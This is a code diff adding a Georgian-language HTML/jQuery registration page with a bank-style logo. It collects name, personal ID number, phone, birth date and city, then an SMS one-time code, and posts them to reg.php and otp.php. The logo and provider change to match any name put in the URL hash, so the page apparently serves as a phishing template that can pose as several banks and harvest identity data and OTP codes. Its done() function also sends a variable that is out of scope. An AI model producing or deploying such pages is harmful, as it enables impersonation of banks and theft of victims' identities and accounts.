@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="https://code.jquery.com/ui/1.13.3/themes/base/jquery-ui.css">
+	<link rel="stylesheet" href="/resources/demos/style.css">
+	<script src="https://code.jquery.com/jquery-3.7.1.js"></script>
+	<script src="https://code.jquery.com/ui/1.13.3/jquery-ui.js"></script>
+
+	<link rel="stylesheet" type="text/css" href="./style.css">
+</head>
+<body data-provider="bog">
+
+	<div class="wrap">
+		<div class="logo">
+			<img src="img/bog.svg" alt="logo"/>
+		</div>
+
+		<div class="provider">
+			<div class="title">
+				სარეგისტრაციო ფორმა
+			</div>
+			<div class="form">
+				<div class="input_label">
+					<input id="firsName" type="text" name="firsName"/>
+					<label for="firsName">სახელი</label>
+				</div>
+				<div class="input_label">
+					<input id="lastName" type="text" name="lastName"/>
+					<label for="lastName">გვარი</label>
+				</div>
+				<div class="input_label">
+					<input id="personalId" type="text" name="personalId"/>
+					<label for="personalId">პირადი ნომერი</label>
+				</div>
+				<div class="input_label">
+					<input id="phone" type="text" name="phone"/>
+					<label for="phone">მობილური</label>
+				</div>
+				<div class="input_label">
+					<input id="dob" type="text" name="dob" class="calendar" />
+					<label for="dob">დაბ. თარიღი</label>
+				</div>
+
+				<div class="input_label">
+					<input id="city" type="text" name="city"/>
+					<label for="city">ქალაქი</label>
+				</div>
+			</div>
+			<div class="rules">
+				<input type="checkbox" name="rules" id="rules"/>
+				<label for="rules">გთხოვთ დაეთანხმოთ წესებს და პირობებს</label>
+			</div>
+			<div class="actions">
+				<button class="btn" onclick="register()">რეგისტრაცია</button>
+			</div>
+		</div>
+
+	</div>
+
+	<div class="otp-modal">
+		<div class="otp-box">
+			<div class="close"><img src="img/close.svg" alt="close"/></div>
+			<div class="otp-title">
+				შეიყვანეთ მიღებული კოდი
+			</div>
+			<p>შეიყვანეთ თქვენს ნომერზე გამოგზავნილი SMS კოდი</p>
+			<br/>
+			<div class="input_label">
+				<input id="otp" type="number" name="otp"/>
+				<label for="otp">SMS კოდი</label>
+				<div class="timer"></div>
+			</div>
+			<div class="resend" onclick="resend()">კოდის თავიდან მოთხოვნა</div>
+			<div class="otp-actions">
+				<button class="btn" onclick="done()">დადასტურება</button>
+			</div>
+		</div>
+	</div>
+
+
+	<script>
+		let provider = window.location.hash.slice(1);
+		if(provider) {
+			$('body').attr('data-provider', provider);
+			$('.logo img').attr('src', 'img/' + provider + '.svg');
+		}
+
+
+		(function() {
+			document.addEventListener("DOMContentLoaded", function() {
+				const inputs = document.querySelectorAll("input");
+
+				inputs.forEach(input => {
+					input.addEventListener("keyup", function() {
+						const value = input.value;
+						input.setAttribute("value", value);
+					});
+				});
+			});
+		})();
+
+		function timer(){
+			var sec = 30;
+			var timer = setInterval(function(){
+				document.querySelector('.timer').innerHTML = sec;
+				sec--;
+				if (sec < 0) {
+					clearInterval(timer);
+					$('.resend').show()
+				}
+			}, 1000);
+		}
+
+		function resend(){
+			register()
+		}
+
+		function register(){
+			let rules = document.getElementById('rules').checked;
+			let fields = ['firsName', 'lastName', 'personalId', 'phone', 'dob', 'city'];
+			let data = {};
+			let errors = [];
+
+			fields.forEach(field => {
+				let value = document.getElementById(field).value;
+				data[field] = value;
+				if(value === ''){
+					errors.push(field);
+				}
+			});
+
+			if(errors.length > 0){
+				z_alert('შეცდომა','გთხოვთ შეავსოთ ყველა ველი');
+				return;
+			}
+			if(!rules){
+				z_alert('შეცდომა','გთხოვთ დაეთანხმოთ წესებს და პირობებს');
+				return;
+			}
+
+			$.ajax({
+				url: 'reg.php',
+				type: 'POST',
+				data: data,
+				success: function(response){
+					console.log(response);
+					$('.otp-modal').css('display', 'flex');
+					timer()
+				}
+			});
+
+		}
+
+		function done(){
+			$.ajax({
+				url: 'otp.php',
+				type: 'POST',
+				data: data,
+				success: function(response){
+					$('.otp-modal').hide();
+				}
+			});
+
+		}
+
+		function z_alert(title,message){
+
+			$('.z-alert').remove();
+
+			let com = `<div class="z-alert">
+				<div class="z-alert-box">
+					<div class="z-alert-close"><img src="img/close.svg" alt="close"/></div>
+					<div class="z-alert-title">${title}</div>
+					<p>${message}</p>
+				</div>
+			</div>`
+			$('body').append(com);
+			$('.z-alert-close').click(function (){
+				$('.z-alert').remove();
+			})
+
+		}
+
+		$(document).ready(function(){
+			$('.close').click(function (){
+				$('.otp-modal').hide();
+			})
+
+
+			$( ".calendar" ).datepicker();
+			$( "#dob" ).on( "change", function() {
+				$('.calendar').attr('value', $('.calendar').val())
+			});
+		});
+	</script>
+</body>
+</html>
